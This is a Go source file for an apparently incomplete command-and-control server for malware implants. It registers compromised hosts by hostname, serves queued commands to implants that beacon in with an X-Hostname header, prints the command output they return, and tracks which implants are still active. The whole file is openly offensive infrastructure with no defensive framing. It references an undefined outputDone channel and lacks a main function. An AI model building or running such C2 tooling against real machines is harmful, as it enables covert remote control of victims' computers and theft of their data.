package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

type Implant struct {
	Hostname string
	LastSeen time.Time
	Active   bool
	Command  string
}

var implants = make(map[string]*Implant)

func hostnameHandler(w http.ResponseWriter, r *http.Request) {

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("[-] Hostname Unknown")
		return
	}
	hostname := strings.TrimSpace(string(body))

	if _, exists := implants[hostname]; !exists { // looks up hostname checks if it exsists if it doesnt create new and store it
		implants[hostname] = &Implant{}
	}
	implants[hostname].Hostname = hostname
	implants[hostname].LastSeen = time.Now()
	implants[hostname].Active = true
	w.WriteHeader(http.StatusOK)

}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	hostname := r.Header.Get("X-Hostname")
	if hostname == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	if implants[hostname] == nil {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}
	if implants[hostname].Command != "" {
		fmt.Fprint(w, implants[hostname].Command)
		implants[hostname].Command = ""
	}

	implants[hostname].LastSeen = time.Now()
}

func responseHandler(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("[-] Response not received")
		return
	}

	fmt.Println(string(body))
	w.WriteHeader(http.StatusOK)
	outputDone <- true

}

func initalizeServer() {

	http.HandleFunc("/hostname", hostnameHandler)
	http.HandleFunc("/beacon", beaconHandler)
	http.HandleFunc("/response", responseHandler)
	http.ListenAndServe("192.168.1.151:8080", nil)
}

func checkImplantStatus() {

	for {
		time.Sleep(10 * time.Second)
		for _, implant := range implants {
			if time.Since(implant.LastSeen) > 30*time.Second {
				implant.Active = false
			} else {
				implant.Active = true
			}
		}
	}
}
